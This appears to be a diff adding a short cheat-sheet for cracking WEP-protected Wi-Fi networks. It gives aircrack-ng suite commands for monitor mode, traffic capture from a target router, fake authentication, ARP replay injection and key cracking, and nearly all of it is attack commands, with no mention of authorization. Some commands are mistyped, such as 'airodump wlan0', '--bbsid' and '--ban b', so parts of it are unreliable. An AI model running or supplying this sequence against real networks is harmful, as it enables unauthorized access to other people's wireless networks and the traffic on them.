@@ -1,0 +1,46 @@
+###### WI-FI WEP HACKING ######
+
+Note: ALL ACTIONS MUST BE TAKEN IN ROOT OR USE SUDO AND WIFI ADAPTER MUST BE IN MONITOR MODE
+
+########## MONITOR MODE SET-UP ###########
+
+airmon-ng
+airmon-ng start wlan0
+
+##### RECONNAISANCE #######
+
+airodump wlan0
+TIP: The lower the power the closer the wireless acceess point.
+
+airodump-ng --channel <channel number> --bbsid <router bssid> --write <Desiredfilename> wlan0
+  
+												                --> keep running until the end of the hack session.
+
+airodump-ng -c <channel number> --bssid <router bssid> -w <file name / desired location (listfull directory)>
+
+TIP: The BSSID number is also the device MAC address
+
+airodump-ng --ban b wlan0 -->> Captures 2.4 GHz Traffic (suitable for WEP connection).
+
+
+###### WEP ADVANCED TECHNIQUE ######
+
+To hack a wep network we basically need as much traffic captured as possible
+sometimes we may have a less busy network, we can speed up this process by sending in random packets into the network.
+
+
+
+######## WEP FAKEAUTHENTICATION #######
+
+aireplay-ng --fakeauth 0 -a <router_bssid> -h <wifi_card_mac_address> wlan0
+
+
+######## WEP REPLAY ATTACK #######
+
+aireplay-ng --arpreplay -b <router_bssid> -h <wifi_card_mac_address> wlan0
+
+
+
+######### WEP CRACKING #########
+
+aircrack-ng wifi.cap file (full path....if needed)
